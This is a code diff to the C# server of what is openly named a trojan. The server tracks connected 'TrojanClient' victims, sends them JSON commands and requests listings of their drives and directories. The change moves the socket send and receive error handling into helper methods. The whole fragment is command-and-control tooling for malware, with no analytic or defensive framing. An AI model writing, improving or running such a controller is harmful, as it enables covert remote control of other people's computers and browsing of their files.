@@ -83,8 +83,7 @@ namespace Server.TCP
 
                 string output = "";
 
-                NetworkStream stream = client.GetStream();
-                if(commandId == 2)
+                if (commandId == 2)
                 {
                     ComplexCommand command = new ComplexCommand(commandId);
                     command.Parameters.Add(serverGUI.GetFirstParameter());
@@ -97,16 +96,9 @@ namespace Server.TCP
                     output = JsonConvert.SerializeObject(command);
                 }
 
-                try
-                {
-                    SendOnSocket(stream, output);
-                    await ReceiveFromSocket(stream, serverGUI.DisplayOutput);
-                }
-                catch
-                {
-                    serverGUI.DisplayOutput("Client does not respond.");
-                    RemoveClient(trojanClient);
-                }
+                SendOnSocket(client, output);
+                await ReceiveFromSocket(client, serverGUI.DisplayOutput);
+
             }
             else
             {
@@ -129,7 +121,6 @@ namespace Server.TCP
 
         private void RegisterClient(TcpClient client, string clientName)
         {
-            //var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
             trojanClients.Add(new TrojanClient(client, clientName));
             serverGUI.SetClients(trojanClients.Select(x => x.Name));
         }
@@ -146,7 +137,6 @@ namespace Server.TCP
 
                 // Get a stream object for reading and writing
 
-                NetworkStream stream = client.GetStream();
                 string path = serverGUI.GetFile();
                 Command command;
                 if (string.IsNullOrEmpty(path))
@@ -159,24 +149,16 @@ namespace Server.TCP
                 }
 
                 string output = JsonConvert.SerializeObject(command);
-                try
+                SendOnSocket(client, output);
+                if (string.IsNullOrEmpty(path))
                 {
-                    SendOnSocket(stream, output);
-                    if (string.IsNullOrEmpty(path))
-                    {
-                        await ReceiveFromSocket(stream, serverGUI.UpdateDrivers);
-                    }
-                    else
-                    {
-                        await ReceiveFromSocket(stream, serverGUI.UpdateList);
-                    }
+                    await ReceiveFromSocket(client, serverGUI.UpdateDrivers);
                 }
-                catch(Exception ea)
+                else
                 {
-                    serverGUI.DisplayOutput("Client does not respond.");
-                    serverGUI.DisplayOutput("Error: " + ea.Message);
-                    RemoveClient(trojanClient);
+                    await ReceiveFromSocket(client, serverGUI.UpdateList);
                 }
+
             }
             else
             {
@@ -184,89 +166,92 @@ namespace Server.TCP
             }
         }
 
-        private async void SendOnSocket(NetworkStream stream, string message)
+        private async void SendOnSocket(TcpClient client, string message)
         {
-            byte[] msg = System.Text.Encoding.ASCII.GetBytes(message);
-            byte[] messageLength = BitConverter.GetBytes((Int32)message.Length);
-            //if (stream.CanWrite)
-            //{
-
-            //    Console.WriteLine(messageLength.Length);
-            //    Console.WriteLine(messageLength);
-
-            //    Console.WriteLine();
-            //    Console.WriteLine(message);
-            //    Console.WriteLine(message.Length);
-            //    //Array.Reverse(messageLength);
-            //    await stream.WriteAsync(messageLength, 0, messageLength.Length);
-            //    Thread.Sleep(200);
-            //    //stream.Flush();
-
-            //}
-
-            if (stream.CanWrite)
+            try
             {
-                await stream.WriteAsync(msg, 0, msg.Length);
-                //stream.Flush();
+                NetworkStream stream = client.GetStream();
+                byte[] msg = System.Text.Encoding.ASCII.GetBytes(message);
+
+                if (stream.CanWrite)
+                {
+                    await stream.WriteAsync(msg, 0, msg.Length);
+                }
+            }
+            catch (Exception e)
+            {
+                serverGUI.DisplayOutput("Cannot send data on socket");
+                serverGUI.DisplayOutput("Error: " + e.Message);
             }
         }
 
-        private async Task ReceiveFromSocket(NetworkStream stream, Action<string> act)
+        private async Task ReceiveFromSocket(TcpClient client, Action<string> act)
         {
-            int i = 0;
-            //var length = new Byte[4];
-            Byte[] bytes = new Byte[500000];
-            if (stream.CanRead)
-            {
-                //i = await stream.ReadAsync(length, 0, 4);
-               // Array.Reverse(length);
 
-                //int lengthNumber = BitConverter.ToInt32(length, 0);
-                //bytes = new Byte[5000];
-                i = await stream.ReadAsync(bytes, 0, bytes.Length);
+            try
+            {
+                NetworkStream stream = client.GetStream();
+                int i = 0;
+                //var length = new Byte[4];
+                Byte[] bytes = new Byte[500000];
+                if (stream.CanRead)
+                {
+                    i = await stream.ReadAsync(bytes, 0, bytes.Length);
+                }
+                string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+                Response responseObj = JsonConvert.DeserializeObject<Response>(response);
+                act(responseObj.response);
             }
-            string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-            Response responseObj = JsonConvert.DeserializeObject<Response>(response);
-            act(responseObj.response);
+            catch (Exception e)
+            {
+                serverGUI.DisplayOutput("Client does not respond.");
+                serverGUI.DisplayOutput("Error: " + e.Message);
+                RemoveClient(client);
+            }
         }
 
-        private async Task ReceiveFromSocket(NetworkStream stream, Action<List<string>> act)
+        private async Task ReceiveFromSocket(TcpClient client, Action<List<string>> act)
         {
-            int i = 0;
-            //var length = new Byte[4];
-            Byte[] bytes = new Byte[500000];
-            if (stream.CanRead)
+            try
             {
-                //i = await stream.ReadAsync(length, 0, 4);
-                // Array.Reverse(length);
-
-                //int lengthNumber = BitConverter.ToInt32(length, 0);
-                //bytes = new Byte[5000];
-                i = await stream.ReadAsync(bytes, 0, bytes.Length);
+                NetworkStream stream = client.GetStream();
+                int i = 0;
+                Byte[] bytes = new Byte[500000];
+                if (stream.CanRead)
+                {
+                    i = await stream.ReadAsync(bytes, 0, bytes.Length);
+                }
+                string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+                ResponseList responseObj = JsonConvert.DeserializeObject<ResponseList>(response);
+                act(responseObj.response);
             }
-            string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-            ResponseList responseObj = JsonConvert.DeserializeObject<ResponseList>(response);
-            act(responseObj.response);
+            catch (Exception e)
+            {
+                serverGUI.DisplayOutput("Client does not respond.");
+                serverGUI.DisplayOutput("Error: " + e.Message);
+                RemoveClient(client);
+            }
         }
 
         private async Task ReceiveFromSocket(TcpClient client, Action<TcpClient, string> act)
         {
-
-            NetworkStream stream = client.GetStream();
-            int i = 0;
-            //var length = new Byte[4];
-            Byte[] bytes = new Byte[5000];
-            if (stream.CanRead)
+            try
             {
-                //i = await stream.ReadAsync(length, 0, 4);
-
-               // Array.Reverse(length);
-
-                //int lengthNumber = BitConverter.ToInt32(length, 0);
-                //bytes = new Byte[5000];
-                i = await stream.ReadAsync(bytes, 0, bytes.Length);
-                string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                act(client, response);
+                NetworkStream stream = client.GetStream();
+                int i = 0;
+                Byte[] bytes = new Byte[5000];
+                if (stream.CanRead)
+                {
+                    i = await stream.ReadAsync(bytes, 0, bytes.Length);
+                    string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+                    act(client, response);
+                }
+            }
+            catch (Exception e)
+            {
+                serverGUI.DisplayOutput("Client does not respond.");
+                serverGUI.DisplayOutput("Error: " + e.Message);
+                RemoveClient(client);
             }
         }
     }
